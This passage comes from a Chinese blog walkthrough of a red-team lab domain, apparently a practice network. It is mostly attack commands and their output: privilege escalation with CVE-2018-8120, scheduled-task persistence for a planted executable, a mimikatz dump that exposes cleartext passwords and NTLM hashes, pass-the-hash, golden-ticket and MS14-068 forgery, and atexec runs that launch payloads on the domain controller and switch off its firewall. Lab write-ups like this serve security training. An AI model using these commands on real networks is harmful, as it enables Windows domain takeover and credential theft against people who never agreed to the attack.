class="line">13</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State   </span><br><span class="line">============================= ==================================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用CVE-2018-8120提权（然后设置payload为bind_tcp即可）：</p><p>使用模块：<code>post/multi/recon/local_exploit_suggester</code>，它会提示哪些可以用</p><p>权限维持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /TN sysRev2 /SC MINUTE /ST 11:01 /TR C:\Windows\4801.exe /RL HIGHEST</span><br></pre></td></tr></table></figure><p>搜集信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1456947 (00000000:00163b33)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : moretz</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2023/7/26 15:29:48</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-1115</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : moretz</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : Moretz2021</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73 </span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 49813 (00000000:0000c295)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : </span><br><span class="line">        wdigest :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : PC2$</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/7/26 15:29:31</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * Password : e5 5c e8 ea be 6d c9 1e e7 9e 5d 3a 6b d1 22 31 21 48 2f a1 4f 52 7e a4 e8 d0 19 80 48 22 97 95 73 4a be 03 c2 d4 5c 66 3c 72 eb 8c b3 2e 9e 81 a1 d3 a3 c3 31 22 c9 36 15 28 3f 1d 2a e3 cc 7d 5b 9b 60 1a c7 51 36 8c c8 25 e8 92 62 4f 58 b3 7f ef 03 98 b6 2a 70 41 ec b3 5a 89 6d 0e da e2 38 4f cb 21 9a ce 76 1a 0e 72 0e 62 0d 4c 7e 44 ce d1 9f e2 41 07 d5 77 f1 74 28 a6 58 3b 41 10 df 25 b2 00 3d fc 6d 2e 1d 5b 65 00 a3 7c 3d 47 91 43 0a 6c d8 bb 09 d7 d8 82 27 36 cb cb b3 a6 b9 db 68 cd 07 9a bb d4 50 c1 8b 5f 24 ee c4 a7 d9 66 51 8a 7d 19 74 b1 1b 9e fe 4d 6f b8 fc e1 85 28 6e b2 b2 dd aa a7 7d ad 2b 86 b7 9a d7 be e5 db e9 07 d1 28 ae 29 96 28 2b 66 ee 57 ea fb 7f db ab e5 3a 37 4b 26 06 6e 3c fa 14 49 cd 73</span><br><span class="line">         </span><br><span class="line">                  [00000003] Primary</span><br><span class="line">         * Username : PC2$</span><br><span class="line">         * Domain   : WHOAMIANONY</span><br><span class="line">         * NTLM     : 803959d82b51f5761137db87ef1aa382</span><br><span class="line">         * SHA1     : bc43c01c03781bc2883789571f720c1f858b1453</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域横向"><a class="markdownIt-Anchor" href="#域横向"></a> 域横向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">#黄金票据</span><br><span class="line">mimikatz.exe kerberos::golden /admin:administrator /domain:WHOAMIANONY.org /sid:S-1-5-21-1315137663-3706837544-1429009142-1115 /krbtgt:ab89b1295e69d353dd7614c7a3a80cec /ticket:gold.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.\MS14-068.exe -u moretz@WHOAMIANONY.org -s S-1-5-21-1315137663-3706837544-1429009142-1115 -d 192.168.93.40 -p Moretz2021</span><br><span class="line"></span><br><span class="line">#先使用IPC传文件，当然也可以用impacket了</span><br><span class="line">schtasks /Create /s 192.168.93.30 /TN sysRev5 /SC MINUTE /ST 11:05 /TR C:\Windows\4802.exe #这次行不通了</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;c:\\Windows\\4803.exe&quot; #需要先关掉防火墙后，我们才能bind进来</span><br><span class="line">atexec.exe -hashes &quot;:ab89b1295e69d353dd7614c7a3a80cec&quot; Administrator@192.168.93.30 &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><h1 id="dc域控"><a class="markdownIt-Anchor" href="#dc域控"></a> DC域控</h1><p>对于横向，无非就几种方法，明文传递（IPC）/哈希传递/票据传递，然后就是约束与非约束委派，再来就是exchange，而执行命令可以使用计划任务执行，也可以使用impacket执行，psexec/smb/wmi执行等。而获取域控的方法有：</p><ul><li>金银票据</li><li>MS14-068</li><li>SYSVOL</li></ul><h2 id="spn"><a class="markdownIt-Anchor" href="#spn"></a> SPN</h2><p>先使用SPN扫一下有什么服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 在任何域机器中执行（需要system权限）</span><br><span class="line">setspn -T WHOAMIANONY.org -Q */*</span><br><span class="line">Checking domain DC=whoamianony,DC=org</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/DC</span><br><span class="line">        TERMSRV/DC.whoamianony.org</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/ForestDnsZones.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/DomainDnsZones.whoamianony.org</span><br><span class="line">        DNS/DC.whoamianony.org</span><br><span class="line">        GC/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/DC</span><br><span class="line">        RPC/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        HOST/DC/WHOAMIANONY</span><br><span class="line">        HOST/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        HOST/DC</span><br><span class="line">        HOST/DC.whoamianony.org</span><br><span class="line">        HOST/DC.whoamianony.org/whoamianony.org</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/01982af1-1153-4ddc-b024-9a35fd66b0af/whoamianony.org</span><br><span class="line">        ldap/DC/WHOAMIANONY</span><br><span class="line">        ldap/01982af1-1153-4ddc-b024-9a35fd66b0af._msdcs.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/WHOAMIANONY</span><br><span class="line">        ldap/DC</span><br><span class="line">        ldap/DC.whoamianony.org</span><br><span class="line">        ldap/DC.whoamianony.org/whoamianony.org</span><br><span class="line">CN=krbtgt,CN=Users,DC=whoamianony,DC=org</span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=PC2,CN=Computers,DC=whoamianony,DC=org</span><br><span class="line">        TERMSRV/PC2</span><br><span class="line">        TERMSRV/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2.whoamianony.org</span><br><span class="line">        HOST/PC2.whoamianony.org</span><br><span class="line">        RestrictedKrbHost/PC2</span><br><span class="line">        HOST/PC2</span><br><span class="line"></span><br><span class="line">Existing SPN found!</span><br></pre></td></tr></table></figure><h2 id="pth"><a class="markdownIt-Anchor" href="#pth"></a> PTH</h2><p>使用mimikatz的pth会生成一个窗口，不太好用，如果密码错误，则这个窗口也不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727144550596.png" alt="image-20230727144550596"></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/9fa2405ea218d96cef3e6995b578ebb5.jpg" alt="9fa2405ea218d96cef3e6995b578ebb5"></p><p>其他还有psexec等等的哈希传递，挺好用的</p><h2 id="金银票据与ms14-068以pc2进行与ptk"><a class="markdownIt-Anchor" href="#金银票据与ms14-068以pc2进行与ptk"></a> 金/银票据与MS14-068（以PC2进行）与PTK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WHOAMIANONY</span><br><span class="line">SID               : S-1-5-21-1315137663-3706837544-1429009142-500</span><br><span class="line">* Username : Administrator</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* Password : Whoami2021</span><br><span class="line">* NTLM     : ab89b1295e69d353dd7614c7a3a80cec</span><br><span class="line"></span><br><span class="line">* Username : bunny</span><br><span class="line">* Domain   : WHOAMIANONY.ORG</span><br><span class="line">* NTLM     : cc567d5556030b7356ee4915ff098c8f</span><br><span class="line">* Password : Bunny2021</span><br><span class="line"></span><br><span class="line">域控IP：192.168.93.30</span><br><span class="line">本机IP：192.168.93.20</span><br></pre></td></tr></table></figure><p>流程：<a target="_blank" rel="noopener" href="https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket">https://www.heresecurity.wiki/heng-xiang-yi-dong/pass-the-ticket</a></p><ol><li><p>清空凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">privilege::debug</span><br><span class="line">kerberos::list //查看当前机器凭证</span><br><span class="line">kerberos::purge//清空当前机器中所有凭证</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>制作金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line">OPTIONS:</span><br><span class="line">    -p &lt;clearPassword&gt;</span><br><span class="line"> --rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u bunny@whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142-500 -d 192.168.93.30 -p Bunny2021</span><br><span class="line"># 得到TGT_moretz@whoamianony.org.ccache</span><br><span class="line"></span><br><span class="line">## 其他工具</span><br><span class="line"># goldenPac.py</span><br><span class="line">python3 goldenPac.py zjun.com/user1:P@ssw0rd@P-DC.zjun.com -dc-ip 172.16.86.136 -target-ip 172.16.86.136 -debug</span><br><span class="line"></span><br><span class="line"># goldenPac.exe</span><br><span class="line">goldenPac.exe zjun.com/user1:P@ssw0rd@P-DC.zjun.com</span><br><span class="line"></span><br><span class="line"># msf</span><br><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line"></span><br><span class="line"># kekeo</span><br><span class="line">exploit::ms14068 /domain:zjun.com /user:user1 /password:P@ssw0rd /sid:S-1-5-21-2335421620-514153290-2844484534-1125 /ptt</span><br><span class="line"></span><br><span class="line"># mimikatz</span><br><span class="line">kerberos::golden /krbtgt: /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727135555788.png" alt="image-20230727135555788"></p></li><li><p>注入票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe </span><br><span class="line">kerberos::ptc TGT_moretz@whoamianony.org.ccache</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727140234573.png" alt="image-20230727140234573"></p></li><li><p>写入成功后，使用PsExec.exe等以管理员权限运行连接域控。<code>Logon Server : DC</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.93.30\ c:\Windows\Temp\4803.exe</span><br></pre></td></tr></table></figure><p>这个psexec是原生的就好，impacket的用不了，以上的图可能放错了，将就看把</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230727161341392.png" alt="image-20230727161341392"></p></li></ol><h2 id="dcomsmbwmi都是impacket就不说了"><a class="markdownIt-Anchor" href="#dcomsmbwmi都是impacket就不说了"></a> DCOM/SMB/WMI（都是impacket，就不说了）</h2><p>DCOM：DCOM 是 COM（组件对象模型）的扩展，它允许应用程序在远程计算机上实例化和访问 COM 对象的属性和方法。参考：<a target="_blank" rel="noopener" href="https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom">https://www.heresecurity.wiki/heng-xiang-yi-dong/dcom-exploitation/dcom</a></p><h2 id="zerologon-cve-2020-1472"><a class="markdownIt-Anchor" href="#zerologon-cve-2020-1472"></a> ZEROLogon CVE-2020-1472</h2><p><a target="_blank" rel="noopener" href="https://www.hacking8.com/tiquan/windows/NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2020-1472.html">https://www.hacking8.com/tiquan/windows/NetLogon域内提权漏洞CVE-2020-1472.html</a></p><h2 id="拿到域控之后"><a class="markdownIt-Anchor" href="#拿到域控之后"></a> 拿到域控之后</h2><p>做维持：</p><ol><li>脱下ndti.dts这个数据库，然后爆破</li><li>搜集kbgts用户的ntlm哈希，存起来用来做金票据（这个跟ms14-068不一样哈，这是堂堂正正拿的！）</li></ol></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/" title="红队靶场-7" target="_blank" rel="external">https://j3f5.github.io/articles/2023/07/13/红队靶场-7/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/j3f5" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/j3f5" target="_blank"><span class="text-dark">妄想星空</span><small class="ml-1x">Web Pentestor</small></a></h3><div>网安小菜鸡，在线总结</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/articles/2023/07/18/fastjson%E5%A4%8D%E7%8E%B0/" title="fastjson复现"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/articles/2023/07/12/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/" title="DC系列靶机"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul><div class="copyright"><div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!0,appId:"yCi6g1FoJhBaWWsmJrysnhSM-gzGzoHsz",appKey:"okzCVsRtNdmyQDW34mMUxKOr",placeholder:"留言",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText,n=(e+="\n/**\n* 感谢您复制代码，使用代码请注明引用出处\n* j3fffff @ https://j3f5.github.io\n*/",document.createElement("textarea")),e=(document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus(),document.execCommand("copy"));document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>